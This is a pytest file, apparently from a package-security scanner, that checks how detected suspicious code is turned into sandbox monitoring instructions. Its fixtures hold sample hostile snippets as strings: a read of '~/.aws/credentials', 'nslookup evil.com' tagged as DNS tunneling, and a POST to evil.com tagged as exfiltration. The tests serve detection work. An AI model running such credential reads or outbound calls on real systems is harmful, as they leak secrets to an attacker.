"""
Contract tests for sandbox instruction generation (INT-4).

Validates that anchor findings produce correct SandboxActionInstruction objects.
"""

import pytest

from skillsentry_dev2.contracts import Finding, SandboxActionInstruction
from skillsentry_dev2.core.semantic.ast_anchor import AnchorFinding
from skillsentry_dev2.core.semantic.sandbox_instructions import (
    generate_sandbox_instructions,
)


class TestSandboxInstructionGeneration:
    def test_credential_anchor_generates_canary_monitor(self):
        anchors = [
            AnchorFinding("scripts/evil.py", 15, "credential_read",
                          "Credential file access", "open('~/.aws/credentials')",
                          "critical", 40),
        ]
        instructions = generate_sandbox_instructions(
            anchor_findings=anchors,
            stage_findings=[],
            intent_keywords=["aws"],
            package_name="test-skill",
        )
        assert any(i.check_category == "CREDENTIAL_CANARY_MONITOR" for i in instructions)
        assert all(i.check_status in ("required", "optional") for i in instructions)

    def test_dns_anchor_generates_sinkhole_watch(self):
        anchors = [
            AnchorFinding("scripts/dns.sh", 5, "nslookup",
                          "DNS tunneling tool", "nslookup evil.com",
                          "high", 30),
        ]
        instructions = generate_sandbox_instructions(
            anchor_findings=anchors,
            stage_findings=[],
            intent_keywords=["generic"],
            package_name="test-skill",
        )
        assert any(i.check_category == "DNS_SINKHOLE_WATCH" for i in instructions)

    def test_http_exfil_generates_monitor(self):
        anchors = [
            AnchorFinding("scripts/exfil.py", 20, "requests_post",
                          "HTTP POST request", "requests.post('https://evil.com')",
                          "low", 10),
        ]
        instructions = generate_sandbox_instructions(
            anchor_findings=anchors,
            stage_findings=[],
            intent_keywords=["generic"],
            package_name="test-skill",
        )
        assert any(i.check_category == "HTTP_EXFIL_MONITOR" for i in instructions)

    def test_path_traversal_blocks_execution(self):
        instructions = generate_sandbox_instructions(
            anchor_findings=[],
            stage_findings=[],
            intent_keywords=["generic"],
            package_name="traversal-skill",
            has_path_traversal=True,
        )
        assert len(instructions) == 1
        assert instructions[0].check_status == "blocked"
        assert instructions[0].check_category == "TRIGGER_EXECUTION"

    def test_no_anchors_baseline_execution(self):
        """When no dangerous patterns found, generates optional baseline."""
        instructions = generate_sandbox_instructions(
            anchor_findings=[],
            stage_findings=[],
            intent_keywords=["generic"],
            package_name="clean-skill",
        )
        assert len(instructions) == 1
        assert instructions[0].check_category == "TRIGGER_EXECUTION"
        assert instructions[0].check_status == "optional"

    def test_deduplication_by_category(self):
        """Multiple credential anchors should produce only one CREDENTIAL_CANARY_MONITOR."""
        anchors = [
            AnchorFinding("f.py", 5, "credential_read", "cred1", "code1", "critical", 40),
            AnchorFinding("f.py", 10, "credential_read", "cred2", "code2", "critical", 40),
        ]
        instructions = generate_sandbox_instructions(
            anchor_findings=anchors,
            stage_findings=[],
            intent_keywords=["aws"],
            package_name="test",
        )
        canary_count = sum(1 for i in instructions if i.check_category == "CREDENTIAL_CANARY_MONITOR")
        assert canary_count == 1

    def test_intent_keywords_propagated(self):
        anchors = [
            AnchorFinding("f.py", 1, "credential_read", "cred", "code", "critical", 40),
        ]
        instructions = generate_sandbox_instructions(
            anchor_findings=anchors,
            stage_findings=[],
            intent_keywords=["aws", "ssh"],
            package_name="test",
        )
        for instr in instructions:
            assert "aws" in instr.contextual_intent or "ssh" in instr.contextual_intent

